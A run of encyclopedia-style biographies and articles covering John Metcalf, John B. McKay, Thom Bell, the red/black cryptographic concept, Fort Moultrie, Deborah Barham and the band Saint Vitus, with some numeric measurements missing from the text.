* Wakefield, Huddersfield and Saddleworth (via the Standedge pass)
* Bury and Blackburn with a branch to Accrington
* Skipton, Colne and Burnley

Metcalf believed a good road should have good foundations, be well drained and have a smooth convex surface to allow rainwater to drain quickly into ditches at the side. He understood the importance of good drainage, knowing it was rain that caused most problems. He worked out a way to build a road across a bog using a series of rafts made from ling (a type of heather) and furze (gorse) tied in bundles as foundations. It established his reputation as a road builder because other engineers believed it could not be done.

He mastered his trade with his own method of calculating costs and materials, which he could never explain to others, and he became known as one of the fathers of the modern road along with Thomas Telford and John MacAdam.

==Later life==
Competition from canals cut into his profits and he retired in 1792 to live with a daughter and her husband at Spofforth in Yorkshire. Throughout his career he built of road. At 77 he walked to York, where he related a detailed account of his life to a publisher.
Blind Jack of Knaresborough died aged 92 on 26 April 1810, at his home in Spofforth where he is buried in the churchyard of All Saints&#x27; Church.

==Memorials==
In 2009 a statue of John Metcalf was placed in the market square in Knaresborough, across from Blind Jack&#x27;s pub.

On 7 July 2017, the A658, the Harrogate Southern Bypass, was named &#x27;John Metcalf Way&#x27;.

==Epitaph==


His headstone, erected in the churchyard of All Saints&#x27; Church, Spofforth, at the cost of Lord Dundas, bears this epitaph:
&quot;Here lies John Metcalf, one whose infant sight
Felt the dark pressure of an endless night;
Yet such the fervour of his dauntless mind,
His limbs full strung, his spirits unconfined,
That, long ere yet life’s bolder years began,
The sightless efforts mark’d th’ aspiring man;
Nor mark’d in vain—high deeds his manhood dared,
And commerce, travel, both his ardour shared.
’Twas his a guide’s unerring aid to lend—
O’er trackless wastes to bid new roads extend;
And, when rebellion reared her giant size,
’Twas his to burn with patriot enterprise;
For parting wife and babes, one pang to feel,
Then welcome danger for his country’s weal.
Reader, like him, exert thy utmost talent given!
Reader, like him, adore the bounteous hand of Heaven.&quot;

<text>John Barron McKay (December 8, 1922 – April 27, 1975) was an American naval officer, World War II pilot, aeronautical engineer, test pilot, and astronaut. He was one of twelve pilots who flew the North American X-15, an experimental spaceplane jointly operated by the United States Air Force and NASA. On September 28, 1965, he flew the X-15 to an altitude of , thereby qualifying as an astronaut according to the United States definition of the boundary of space. However, this altitude did not surpass the Kármán line as defined by the FAI, the FAI-accepted boundary of .

On November 9, 1962, McKay was injured when forced to make an emergency landing in the X-15-2, the second of three planes in the X-15 fleet. The craft rolled over, and McKay suffered crushed vertebrae. Subsequently, the damaged plane was refurbished to become the X-15A-2, a modified variant. Although McKay returned to flight as an X-15 pilot, his injuries contributed to an early death. He died on April 27, 1975, aged 52.

==Early life and education==
Born on December 8, 1922, in Portsmouth, Virginia, to parents Milton Barron McKay (1895–1974) and Wilhelmina Emaline McKay (; 1885–1970). During World War II he served as a Naval Aviator in the Pacific Theater, earning the Air Medal with two clusters, and a Presidential Unit Citation. He graduated from Virginia Polytechnic Institute in 1950 with a Bachelor of Science degree in Aeronautical Engineering. He was married and had eight children.

==Test pilot==

McKay worked for the National Advisory Committee for Aeronautics (NACA) and its successor, NASA, from February 8, 1951, until October 5, 1971, and specialized in high-speed flight research programs. He began as an NACA intern, but assumed pilot status on July 11, 1952. In addition to the X-15, he flew such experimental aircraft as the D-558-1, D-558-2, X-lB, and the X-lE. He has also served as a research pilot on flight programs involving the F-100, F-102, F-104 and the F-107. In 1958, McKay was selected for and would have participated in the U.S. Air Force&#x27;s Man In Space Soonest program, had it come to fruition.

McKay wrote several technical papers, and was a member of the American Institute of Aeronautics and Astronautics, as well as the Society of Experimental Test Pilots.

==Accident==

On 9 November 1962, McKay undertook Flight 74 of the X-15 program on the X-15 56-6671 which was the Number-Two X-15 on its 31st flight. The X-15 was attached to its mothership the Boeing NB-52B Stratofortress 53-008, nicknamed &quot;Balls 8&quot;. McKay&#x27;s mission was to reach an altitude of at Mach 5.5 and to fly the aircraft without the lower part of its ventral fin. Further, the mission was to determine the flight response and stability of the aircraft and the characteristics of its flight boundary layer.

The X-15 was released from the Stratofortress on schedule at over Mud Lake, Nevada at 10:23:07.0 local time with a launch speed of 450 knots. Upon release, McKay was unable to attain the full power of the rocket engine which became stuck at 30% power and unresponsive to throttle control. Due to the lack of throttle response it was decided to make a forced landing at Mud Lake instead of landing at Edwards Air Force Base due to concerns about the reliability of the engine. McKay was at an altitude of having attained a speed of Mach 1.49 when he started his descent for landing at Mud Lake. The motor was kept operating for 70.5 seconds to burn excess fuel and to reduce weight. The flaps failed to activate during landing and the aircraft speed at touchdown was higher than normal. Due to the excess speed and weight the aircraft experienced failures because of the increased dynamic loading which eventually led to its overturning.

The X-15 airframe rolled and struck the lakebed while inverted. While McKay appeared to suffer no permanent disabilities as a result of the crash, evidence was later found that he had sustained brain damage. Also, while he returned to piloting duties with NASA, recurring severe pain caused by the crash forced his early retirement.

==Death==
McKay died on April 27, 1975, in Lancaster, California, at the age of 52. 

Injuries suffered by McKay in the X-15 crash and subsequent permanent pain were a major factor in his premature death. He also suffered from diabetes and turned to alcohol to numb the pain of his accident injuries. Liver disease was a contributing factor to his death. In 1996, he was inducted into the Aerospace Walk of Honor, and in 2005 he was posthumously awarded Astronaut Wings.

==Awards and honors==
* Air Medal (two clusters)
* Presidential Unit Citation
* John J. Montgomery Award
* National Society of Aerospace Professionals
* Award for Achievement, National Aeronautics Association
* Virginia Polytechnic Institute&#x27;s Hall of Fame

<text>Thomas Randolph Bell (January 26, 1943 – December 22, 2022) was an American record producer, arranger, and songwriter known as one of the creators of Philadelphia soul in the 1970s. Hailed as one of the most prolific R&amp;B songwriters and producers ever, Bell found success crafting songs for Delfonics, Stylistics, and Spinners. In June 2006, Bell was inducted into the Songwriters Hall of Fame. In 2016, Bell was inducted into the Musicians Hall of Fame and Museum.

==Background==
Bell was born on January 26, 1943 in Kingston, Jamaica, to Anna and Leroy Bell, and moved to Philadelphia with his parents when he was four, according to an interview Bell had with Terry Gross on NPR&#x27;s Fresh Air. Both of Bell&#x27;s parents were from Jamaica. Thomas Bedward Burke, Bell&#x27;s maternal grandfather, was born in Kingston.

Known as Thom, Bell was one of eleven siblings. His mother, Anna, worked as a stenographer and was a pianist. Leroy, his father, owned a fish market and restaurant in addition to being musical, playing the accordion and Hawaiian guitar.

== Career ==
Bell was classically trained as a musician and sang as a teenager with Kenny Gamble, Leon Huff, and Daryl Hall (of Hall &amp; Oates fame). Bell&#x27;s first big break in soul music was with Cameo Records in Philadelphia where he worked as a session player and arranger. In 1967, he was introduced to a local group called The Delfonics, and he produced two early singles for them on Moon Shot and Cameo labels. Bell brought a mellifluous and hypnotic style to soul music. Soon this production aesthetic yielded several big hits for the group on the Philly Groove label, run by their manager Stan Watson. The releases included &quot;La-La (Means I Love You)&quot; and &quot;Didn&#x27;t I (Blow Your Mind This Time),&quot; the latter of which was nominated for a Grammy Award in 1970.

Bell joined the fast-growing record production company operated by Kenny Gamble and Leon Huff in Philadelphia, working as an arranger for acts including Jerry Butler, Archie Bell &amp; the Drells, Jerry Bell, The O&#x27;Jays, and Dusty Springfield. He arranged big hits, including the O&#x27;Jays&#x27; popular &quot;Back Stabbers,&quot; on Gamble and Huff&#x27;s record label, Philadelphia International Records, which the two launched in 1971. Bell then joined Gamble and Huff in setting up a publishing company for their songs, Mighty Three Music.

By 1971, Bell had moved on to produce a local group, the Stylistics on Avco Records. He had started to work with songwriter Linda Creed, from Philadelphia; their partnership became one of the era&#x27;s dominant soul songwriting teams, writing Stylistics hits including &quot;Stop, Look, Listen (To Your Heart)&quot;, &quot;You Are Everything&quot;, &quot;Betcha by Golly, Wow&quot;, &quot;Break Up to Make Up&quot;, &quot;You Make Me Feel Brand New&quot;, and &quot;I&#x27;m Stone in Love with You&quot; (the last co-written with Bell&#x27;s brother Tony). In 1972, Bell agreed to produce The Spinners for Atlantic Records. The group had left their longtime label, Motown, after years of only occasional success there. He made them a hit recording act, producing five gold albums and top-ten singles including &quot;I&#x27;ll Be Around&quot;, &quot;Could It Be I&#x27;m Falling in Love&quot;, &quot;Games People Play&quot;, and &quot;The Rubberband Man&quot;. In 1974, he was awarded a Grammy for Best Producer of the Year.

In 1975, Bell produced an album for Dionne Warwick called &quot;Track of the Cat&quot; which followed &quot;Then Came You,&quot; her collaboration with Bell and the Spinners from 1974. It topped the Billboard Hot 100 reaching number two on the R&amp;B chart. Bell worked in the mid-to-late &#x27;70s with Johnny Mathis (two albums), Billy Paul, Ronnie Dyson, Little Anthony and the Imperials, the R&amp;B group New York City, and others. Then Bell had success with Deniece Williams including her R&amp;B number-one and top-ten remake of The Royalettes&#x27; &quot;It&#x27;s Gonna Take a Miracle&quot; in 1982; Elton John, whose EP &quot;The Thom Bell Sessions&quot; featured backing vocals by the Spinners and produced the top-ten hit &quot;Mama Can&#x27;t Buy You Love&quot; in 1979; and James Ingram, whose &quot;I Don&#x27;t Have the Heart&quot; became Bell&#x27;s second number-one pop hit, in 1990. Other artists Bell produced in the 1980s included The Temptations, Phyllis Hyman, and Dee Dee Bridgewater; he also re-united briefly with the Stylistics in 1981 on Philadelphia International&#x27;s subsidiary, TSOP. Warner Chappell Music acquired Mighty Three Music in 1990. A December 2008 interview with Bell featured on the Philly Soul box set, &quot;Love Train&quot;, stated he would soon compose a piece for the Philadelphia Orchestra. Past Orchestra members played in MFSB, the house band who played on many Bell productions.

Bell was known for being a perfectionist in his writing and very budget-conscious, demanding that session musicians play his compositions as they were written and not improvise.

== Personal life ==
Bell married Sylvia Bell in 1965 and they divorced in 1984. He married Vanessa Joanne Wittrock in Seattle on December 29, 1985. He had six children.

On December 22, 2022 at the age of 79, Bell died at his home in Bellingham, Washington north of Everett, after a lengthy illness.

<text>The red/black concept, sometimes called the red–black architecture
or red/black engineering,
refers to the careful segregation in cryptographic systems of signals that contain sensitive or classified plaintext information (red signals) from those that carry encrypted information, or ciphertext (black signals). Therefore, the red side is usually considered the internal side, and the black side the more public side, with often some sort of guard, firewall or data-diode between the two.

In NSA jargon, encryption devices are often called blackers, because they convert red signals to black. TEMPEST standards spelled out in Tempest/2-95 specify shielding or a minimum physical distance between wires or equipment carrying or processing red and black signals.

Different organizations have differing requirements for the separation of red and black fiber-optic cables.

Red/black terminology is also applied to cryptographic keys. Black keys have themselves been encrypted with a &quot;key encryption key&quot; (KEK) and are therefore benign. Red keys are not encrypted and must be treated as highly sensitive material.

==Red/Gray/Black==

The NSA&#x27;s Commercial Solutions for Classified (CSfC) program, which uses two layers of independent, commercial off-the-shelf cryptographic products to protect classified information, includes a red/gray/black concept. In this extension of the red/black concept, the separated gray compartment handles data that has been encrypted only once, which happens at the red/gray boundary. The gray/black interface adds or removes a second layer of encryption.

<text>Fort Moultrie is a series of fortifications on Sullivan&#x27;s Island, South Carolina, built to protect the city of Charleston, South Carolina. The first fort, formerly named Fort Sullivan, built of palmetto logs, inspired the flag and nickname of South Carolina, as &quot;The Palmetto State&quot;. The fort was renamed for the U.S. patriot commander in the Battle of Sullivan&#x27;s Island, General William Moultrie. During British occupation, in 1780–1782, the fort was known as Fort Arbuthnot.

==History==

===American Revolution===
Col. Moultrie took command of Sullivan&#x27;s Island on March 2, 1776, which included a garrison of 413 men of the 2nd South Carolina Regiment of Infantry and 22 men of the 4th South Carolina Regiment, artillery. The island included a fort, still under construction at the southern tip, which was being supervised by Capt. De Brahm. The square design, with corner bastions, was supposed to have parallel rows of palmetto logs , filled in with . However, by June 28, only the front (the southeast and southeast curtain walls and bastions) was complete. The northern portion of the fort was unfinished, standing at only . Cavaliers were constructed along the rear walls. The blue flag on the southeast bastion had the word &quot;Liberty&quot; on it. A total of 31 guns commanded the approach from Five Fathom Hole offshore, past the island and the Middle Ground shoal, before ships could enter the harbor.

South Carolina patriots began to build a fort to guard Charleston, South Carolina, harbor in 1776. Royal Navy Admiral Sir Peter Parker led a fleet of nine warships in an attack against the fort—known as Fort Sullivan and incomplete—on June 28, 1776, near the beginning of the American Revolutionary War. The soft palmetto logs did not crack under bombardment but rather absorbed the shot; cannonballs reportedly even bounced off the walls of the structure. William Moultrie, commander of the 2nd South Carolina Regiment, and his four hundred men fought a day-long battle that ended with Parker&#x27;s heavily damaged fleet being driven from the area. The fort hence took its name, as Fort Moultrie, in his honor. Charleston locals celebrate &quot;Carolina Day&quot; to commemorate the bravery of the defenders of the fort.

During this battle, Moultrie flew a flag of his own design, authorized by the colonial government. It was later called the Moultrie flag, or Liberty flag, and became iconic to the Revolution in the South.

The British eventually captured Fort Moultrie, as part of the Siege of Charleston in spring 1780, and renamed it as Fort Arbuthnot. Nevertheless, the Patriots won the war, and British troops departed in 1782, at which time the flag was presented in Charleston, by General Nathanael Greene, commander of the southern Regulars.

===Early federal period===
Great Britain and France began another war in 1793, heightening tensions. The United States of America thence embarked on a significant fortification program for important harbors, later called the First System of fortifications. Atop the decayed original Fort Moultrie, the Army completed a new fort in 1798; the Army also built nineteen other new forts along the Atlantic coast. The fort was garrisoned by Captain Jonathan Robeson&#x27;s company of the Regiment of Artillerists in 1802. However, after years of neglect, the Antigua–Charleston hurricane destroyed Fort Moultrie in 1804.

Fort Moultrie was rebuilt as part of the Second System of fortifications in 1808–09, under the direction of Army engineer Alexander Macomb. A report by the Secretary of War, on fortifications in December 1811, describes Fort Moultrie as:
: &quot;an irregular form, built of brick, presenting a battery of three sides on the sea front, and the whole is enclosed with ramparts, parapets, &amp;c. mounting 40 guns. … The barracks are of brick … for five hundred (soldiers)&quot;.

Fort Moultrie&#x27;s main design did not change much over the next five decades. The Army altered the parapet and modernized the armament, but defense of Charleston centered increasingly around newly created Fort Sumter. By the time of the American Civil War, Fort Moultrie, Fort Sumter, Fort Johnson, and Castle Pinckney surrounded and defended Charleston.

Fort Moultrie began to record meteorological observations in the early 1820s.

For fifty years the Army detained Native American prisoners at Fort Moultrie. Seminole Indian fighter Osceola and some fellow Seminoles were captured in late 1837 and transferred to the fort. Osceola died of malaria in January 1838; the Army buried his corpse at the front gate of Fort Moultrie and thereafter maintained his grave.

===Civil War===
In the months leading up to the Civil War, John L. Gardner was in command at Fort Moultrie. With secession growing more imminent, Gardner had made several requests to Secretary of War John B. Floyd for more troops to garrison and defend the undermanned fortress. Each time his requests were ignored, as Floyd (who joined the Confederacy) was planning to hand the forts in Charleston Harbor over to the secessionists.

South Carolina seceded from the Union on December 20, 1860, after the first election of President Abraham Lincoln. Around this time a Federal garrison from the 1st US Artillery was sent to Fort Moultrie. Unlike the state militia at the other forts, the U.S. Regular Army defenders of Fort Moultrie chose not to surrender to the South Carolina forces. On December 26, 1860, Union Major Robert Anderson moved his garrison from Fort Moultrie to the stronger Fort Sumter. On February 8, 1861, South Carolina joined the five other seceded Deep Southern states to form the Confederate States of America. In April 1861, Confederate troops shelled Fort Sumter into submission, and the American Civil War began.

In April 1863, Federal ironclads and shore batteries began a bombardment of Fort Moultrie and the other forts around Charleston harbor. Over the ensuing twenty months, Union bombardment reduced Fort Sumter to a rubble pile and pounded Fort Moultrie below a sand hill, which protected it against further bombardment. The rifled cannon proved its superiority to brickwork fortifications but not to the endurance of the Confederate artillerymen who continued to man Fort Moultrie. In February 1865, as General Sherman marched through South Carolina, the Confederate soldiers finally abandoned the rubble of Fort Moultrie and evacuated the city of Charleston.

===Postbellum period and 20th century===
The U.S. Army modernized Fort Moultrie in the 1870s with new weapons and deep concrete bunkers. Weapons of this period included 15-inch and 10-inch Rodman guns (), which were smoothbores, and 8-inch converted rifles, lined down from 10-inch Rodmans.

Beginning in 1897, Fort Moultrie&#x27;s armament was modernized under the large-scale Endicott Program of coast defenses. Eight new reinforced-concrete batteries were completed by 1906, and part of the Second System fort was demolished to make room for batteries Bingham, McCorkle, and Lord. The fort also had a mine casemate to control a naval minefield. In 1901 Coast Artillery units were designated from heavy artillery units, and in 1907 the United States Army Coast Artillery Corps was formed to garrison the new coast defenses.

The Endicott Program batteries at Fort Moultrie were:


Battery Capron, with sixteen 12-inch mortars, was the largest component of the new defenses. In 1906 it was organizationally split into two batteries, Capron and Butler, each with eight mortars. Batteries Jasper and Thomson provided longer-range weapons with a total of six 10-inch disappearing guns. In April 1898 the Spanish–American War broke out, with Fort Moultrie&#x27;s smaller, rapid-fire batteries still years from completion. Batteries Logan and Bingham were added to the fort, mostly equipped with weapons purchased from the United Kingdom. In 1901 Battery McCorkle was added to defend the minefield against minesweepers with three 3-inch guns on retractable masking parapet carriages. In 1905 Battery Lord was added with two 3-inch guns, and in 1906 Battery Gadsden provided four 6-inch rapid-fire disappearing guns.

These batteries were supplemented in 1899 by a pair of 12-inch guns at Fort Sumter. Forts Moultrie and Sumter constituted the Coast Defenses of Charleston, as the Charleston Coast Artillery District was designated in 1913.

Battery Capron was named for Captain Allyn K. Capron of the 1st US Volunteer Cavalry, the famous &quot;Rough Riders&quot;, who was the first US Army officer killed in the Spanish–American War. Battery Butler was named for Colonel Pierce M. Butler of the Palmetto Regiment, killed in the Battle of Churubusco in the 1847 Mexican–American War. Battery Jasper was named for Sergeant William Jasper of the 2nd South Carolina Regiment, a hero of the 1776 attack on the fort. Battery Thomson was named for Colonel William Thomson of the 3rd South Carolina Regiment, commended for defending Charleston in June 1776. Battery Gadsden was named for Brigadier General Christopher Gadsden, a South Carolina officer of the Revolutionary War. Battery Logan was named for Captain William Logan, killed fighting the Nez Perce in 1877. Battery Bingham was named for 2nd Lieutenant Horatio Bingham, killed fighting the Sioux in 1866. Battery McCorkle was named for 1st Lieutenant Henry McCorkle of the 25th US Infantry Regiment, killed in the Battle of El Caney in the Spanish–American War. Battery Lord was named for Assistant Surgeon George Edwin Lord, killed at the Battle of the Little Big Horn, also called &quot;Custer&#x27;s Last Stand&quot;, in 1876.

In 1904 Battery Logan&#x27;s 6-inch Armstrong gun was removed and most likely transferred to Fort Adams.

After the US entered World War I, Battery Gadsden&#x27;s four 6-inch guns were removed for service on field carriages on the Western Front in 1917 and were never returned to the fort. Records show the guns arrived in France, but a history of the Coast Artillery in World War I states that none of the regiments in France equipped with 6-inch guns completed training in time to see action before the Armistice.

Two of Battery Jasper&#x27;s four 10-inch guns were similarly removed in 1918 for potential use as railway guns; they were never returned to the fort but were replaced with guns from Fort Washington in 1919.

Following World War I there were several changes at Fort Moultrie as part of a forcewide partial disarmament of the coast defense system. Battery Bingham&#x27;s two 4.7-inch Armstrong guns and Battery McCorkle&#x27;s three 3-inch M1898 guns were removed in 1919–20 as part of a general removal from service of some gun types. Eight of Battery Capron-Butler&#x27;s mortars were removed and the remaining eight replaced with M1890 mortars on M1896 carriages in 1920. The removal of half the mortars was a forcewide measure to increase the rate of fire by reducing overcrowding of mortar pits during reloading.

With the outbreak of World War II in 1939 and the Fall of France in 1940, a comprehensive upgrade of US coastal fortifications was implemented. In the early part of the war the Harbor Defenses of Charleston were garrisoned by the 13th Coast Artillery Regiment of the Regular Army and the 263rd Coast Artillery Regiment of the South Carolina National Guard. The Marshall Military Reservation, a sub-post of Fort Moultrie, was established in the northeast part of Sullivan&#x27;s Island to accommodate the new batteries. The batteries built during World War II at and near Fort Moultrie were:
*BCN = Battery Construction Number
*AMTB = Anti-Motor Torpedo Boat Battery
Additionally, a battery of two 16-inch guns designated BCN 125 was proposed for James Island, south of Charleston Harbor, but was never built.

The unnamed battery of four 155 mm M1918 towed guns on concrete Panama mounts was established in 1941 to quickly augment Charleston&#x27;s harbor defenses.
The construction of the long-range BCN 520 with 12-inch guns rendered all previous gun defenses in the Charleston area obsolete. BCN 520 was armed with guns removed from Battery Kimble at Fort Travis, Galveston, Texas. Almost all of Fort Moultrie&#x27;s previous armament was scrapped in 1942, except Battery Thomson&#x27;s pair of 10-inch guns and Battery Lord&#x27;s pair of 3-inch guns. The two fixed emplacements of AMTB 2A were built on the former 10-inch Battery Jasper. A Harbor Entrance Control Post (HECP) to coordinate Army and Navy harbor defenses was established at the old fort and has been refurbished as an exhibit.

On August 15, 1947, the Army lowered Fort Moultrie&#x27;s flag for the last time and ended 171 years of service. After the war, due to changes in military technology, including submarines and nuclear weapons, seacoast defense of the United States ceased to be a viable strategy.

==Decommissioning==

In 1960, the Department of Defense transferred Fort Moultrie to the National Park Service. NPS manages the historic fort as a unit of Fort Sumter and Fort Moultrie National Historical Park. NPS has interpreted the fort as a tour backward in time from its defenses from World War II to the original palmetto log fort constructed by William Moultrie. The preserved Harbor Entrance Control Post and BCN 520 (now a private residence) are the main relics of the World War II era.

The National Register of Historic Places listed Fort Moultrie Quartermaster and Support Facilities Historic District on September 6, 2007. In 2016, the America the Beautiful quarter for South Carolina featured Fort Moultrie.

In 1999, the construction of a tall private home next to the fort that blocked the sightline to Fort Sumter led to a successful campaign to eliminate the problem. The American Battlefield Trust, then known as the Civil War Preservation Trust, was assisted by the National Park Service, the Trust for Public Land, and a consortium of local residents in buying the plot from the landowner and removing the building.

Moultrie is honored with his statue in The Battery section of downtown Charleston.

<text>Deborah Ann Barham (20 November 1976 – 20 April 2003) was an English comedy writer who died at the age of 26 of heart failure brought on as a result of anorexia. As well as writing for TV and radio, Barham wrote columns for newspapers and magazines.

== Life ==
Barham was born 20 November 1976 in Sheffield, England. She was educated at Sheffield High School and was a bright student, but left school early as she was unhappy there.

She began her professional writing career at the age of 15, moved to London at the age of 16, and was working as a BBC contract writer at the age of 17. In 1995, Barham developed anorexia nervosa.

Her early work was submitted under the name D. A. Barham, out of concern that a teenage girl would not be accepted in a world traditionally dominated by Oxbridge-educated men.

During her eleven-year career she wrote for comedians including Clive Anderson, Rory Bremner, Angus Deayton, Bob Monkhouse and Graham Norton, and for BBC programmes including &quot;The News Huddlines&quot;, &quot;The News Quiz&quot;, &quot;Loose Ends&quot; and &quot;Week Ending&quot;. She also wrote the eight-part radio sitcom &quot;The Elephant Man&quot;, which starred Peter Serafinowicz and was broadcast on BBC Radio 2 in 1996. Though little known by the general public, she was greatly respected in the profession, and had a reputation for mental quickness, her writing being not only of high quality but also fast and prolific, even during her illness. She wrote a column for &quot;Computeractive&quot; magazine for the few years prior to her death.

The radio show &quot;About a Dog&quot; was based on her last comedy proposal.

<doc id="1065542" wikidata="Q514336" url="?curid=1065542" title="Saint Vitus (band)">
<text>Saint Vitus is an American doom metal band formed in Los Angeles in 1978. They are considered to be one of the first doom metal bands, and have been labeled as one of the &quot;big four&quot; of that genre, along with Candlemass, Pentagram and Trouble. Having released nine studio albums to date, Saint Vitus never achieved a popular breakthrough, but have exerted great influence on the development of doom metal, sludge metal, and stoner rock.

The original lineup consisted of Dave Chandler (guitar), Mark Adams (bass), Armando Acosta (drums) and Scott Reagers (vocals). They recorded their first two albums before Scott Weinrich replaced Reagers in 1986. The lineup of Chandler, Adams, Acosta and Weinrich is the longest-lasting. The third album &quot;Born Too Late&quot; (1986) is generally acknowledged as their best release.

After breaking up in 1996 and briefly reforming in 2003, Saint Vitus reunited again in 2008 with the band&#x27;s &quot;classic&quot; lineup, featuring Weinrich, Chandler, Adams and Acosta, and embarked on a successful tour. However, after 30 years in the band, Acosta left Saint Vitus in 2009 due to worsening health, and was replaced by Henry Vasquez. By 2016, both Weinrich and Adams had left Saint Vitus and were replaced by Reagers and Pat Bruders respectively, leaving Chandler as the only constant member of the band and reuniting half of the original lineup.

== History ==

=== Formation and first two albums (1978–1985) ===
The band was formed in 1978 under the name Tyrant, with Dave Chandler (guitar), Mark Adams (bass), and Armando Acosta (drums). Vocalist Scott Reagers joined the group after the first Tyrant show, when their first singer was fired. Their main influences were Black Sabbath, Judas Priest, Blue Cheer, Blue Öyster Cult and Alice Cooper. They changed their name to Saint Vitus in 1980, after the Black Sabbath song &quot;St. Vitus Dance&quot;.

The band&#x27;s early sound combined the dark and psychedelic style of bands like Black Sabbath and Blue Cheer with the aggressive heavy metal and hardcore sound of Judas Priest and Black Flag, another favorite band of Chandler. In the beginning, their style was considered &quot;out-of-date&quot; compared to the hardcore punk, glam and speed metal genres, which were popular at the time. Being rejected by the Los Angeles metal community, Saint Vitus were involved in the punk rock scene. During a live performance with Overkill, Saint Vitus was discovered by Black Flag. Black Flag guitarist Greg Ginn signed them to his label, SST Records, because, according to Chandler, they were &quot;completely opposite of what popular was in metal&quot;. Saint Vitus toured with Black Flag during the early 1980s, and later with other groups like the Brood, Saccharine Trust, the Mentors, Napalm Beach and DC3.

Chandler affirmed: &quot;the heavy metal fans at the time hated us, and so did the punk rockers, but the punk rockers grew to appreciate us&quot;. Under this lineup, Saint Vitus recorded 2 albums (&quot;Saint Vitus&quot; &amp; &quot;Hallow&#x27;s Victim&quot;) and an EP (&quot;The Walking Dead&quot;). Reagers left the band in early 1986, and was replaced by The Obsessed frontman Scott &quot;Wino&quot; Weinrich (at this time, The Obsessed had only released one 7&quot;). Reagers&#x27; final performances featured songs from then-upcoming album &quot;Born Too Late&quot;, such as &quot;The War Starter&quot; and &quot;H.A.A.G&quot;, as many of these were written while he was still in the band.

=== Weinrich-era (1986–1991) ===
Wino recorded three studio albums (&quot;Born Too Late&quot;, &quot;Mournful Cries&quot; &amp; &quot;V&quot;), a live album (&quot;Live&quot;), and an EP (&quot;Thirsty and Miserable&quot;, featuring the Black Flag cover of the same name) with Saint Vitus. &quot;Born Too Late&quot; proved to be their most acclaimed album and the title track is considered an anthem of the doom metal genre. The Wino years marked a change in their style, featuring an even slower and darker sound, in contrast to the hardcore influences of the first two records with Reagers, and the band started to gain some notoriety in Europe.

Weinrich also wrote some songs such as &quot;Bitter Truth&quot;, &quot;Looking Glass&quot; and &quot;Ice Monkey&quot;, the latter was covered by supergroup Down in their early live performances. By 1989, Saint Vitus had been dropped from SST and signed to Hellhound Records, who released the band&#x27;s next three albums. Weinrich left Saint Vitus in 1991 to reform The Obsessed after Saint Vitus&#x27; label, Hellhound Records, released an album of older Obsessed recordings.

=== &quot;C.O.D.&quot;, &quot;Die Healing&quot;, and breakup (1992–2002) ===
Following Weinrich&#x27;s departure, the band found former Count Raven singer Christian &quot;Chritus&quot; Linderson as a replacement after a short search. He would record only one album, &quot;C.O.D.&quot;, produced by Don Dokken, and tour Europe and America with the band until 1993 before being replaced by original vocalist Scott Reagers for what would for a long time be their final album, &quot;Die Healing&quot;, regarded by Chandler to be their finest work. Saint Vitus played dates in America and Europe following the album&#x27;s release. After the completion of the tour, Saint Vitus decided to disband in 1996.

Chandler went on to form the punk/doom band Debris Inc., with Ron Holzner of Trouble in the early 2000s. They released their self-titled album via Rise Above Records in 2005. Acosta stayed busy with a band called Dirty Red, Adams no longer played music, and Reagers also left the music scene. After The Obsessed broke up in the mid-1990s, Wino moved back to Maryland and formed Shine/Spirit Caravan and once again toured Europe and the US until the band&#x27;s break up in the early 2000s. His next band, The Hidden Hand, followed a similar path before breaking up in the mid-2000s. Wino also briefly joined Place of Skulls, featuring former Pentagram/Death Row guitarist Victor Griffin, for the album &quot;With Vision&quot; released in 2003.

=== Reunion(s) and Acosta&#x27;s death (2003–2010) ===
On July 1, 2003, the classic &quot;Born Too Late&quot; lineup (Weinrich, Chandler, Adams, Acosta) played a gig at Double Door in Chicago.

In 2008, it was announced that Saint Vitus were reuniting again for a tour in 2009. The band headlined Friday&#x27;s April 24 date at the 2009 Roadburn Festival. at the 013 venue in Tilburg, Netherlands and then went on to play three gigs in Germany. The lineup for this reunion was the same as the 2003 reunion. Drummer Armando Acosta, who had been with the band since its inception over thirty years ago, left the band before the European tour of 2009 had been completed.

Dave Chandler has cited health concerns as the reason for Armando&#x27;s replacement. Armando Acosta died on November 25, 2010, from arterial complications at the age of 58, and was buried at Riverside National Cemetery in California.

He was then replaced by Henry Vasquez of the band Blood of the Sun. Wino also released one album to date as a member of the Doom Supergroup &quot;Shrinebuilder&quot; in 2009.

=== &quot;Lillie: F-65&quot; (2011–2012) ===

In February 2010, Chandler stated that there was talk of Saint Vitus recording new material, but there were no concrete plans at the time. However, according to frontman Weinrich, &quot;we&#x27;re writing some stuff right now. Everybody&#x27;s pretty busy. I know I&#x27;ve been busy. The Wino band is pretty much on hiatus right now. So it looks like we&#x27;ll be doing some recording in the near future. The bottom line is we would like to do a new record. There&#x27;s talk about it. We&#x27;ve already been floating around a couple ideas. So yeah, somewhere down the line there will be a new Vitus record in the cards.&quot;

In March 2010, Wino revealed to the German edition of &quot;Metal Hammer&quot; magazine that Saint Vitus were without a record label, and had only written one new song so far, but that a full-length studio effort from the group would likely surface within the next 12 months, making a 2011 release date likely. However, plans eventually fell through, but had planned to regroup to make the album sometime in the summer of 2011, after the band finished the 2011 Metalliance Tour with Helmet and Crowbar.

On the Metalliance Tour, Saint Vitus debuted a new song called &quot;Blessed Night&quot;. On November 8, 2010, it was announced that they were signed to Season of Mist and would release their new album, entitled &quot;&quot;, on April 27, 2012. It marked Saint Vitus&#x27; first studio album since 1995&#x27;s &quot;Die Healing&quot;, its first release with vocalist Weinrich since 1990&#x27;s &quot;V&quot; and first release without Armando Acosta on drums.

Late 2009 through 2010 also saw the majority of Saint Vitus&#x27; back catalog come back into print. SST Records reissued vinyl versions of all the group&#x27;s records except for the first album, which was reissued on CD. The label also released &quot;Hallow&#x27;s Victim&quot; and &quot;The Walking Dead&quot; on CD, having never previously been available in the format. Buried By Time and Dust Records also did a limited vinyl issue of &quot;Die Healing&quot; (the first time that album had been available on vinyl) with a CD reissue expected to follow.

In an April 2012 interview with Drop-D, guitarist Dave Chandler was asked if Saint Vitus was going to make another album after &quot;Lillie: F-65&quot;. His response was, &quot;Right now we&#x27;re just taking it step by step to see how people respond to [the new album]. There would be no reason not to because when you&#x27;re constantly playing you get a lot of ideas. We&#x27;re not going to say yes or no now. There are a lot of people talking about the record so hopefully it will live up to everybody&#x27;s expectations.&quot;

=== Recent activities (2015–present) ===
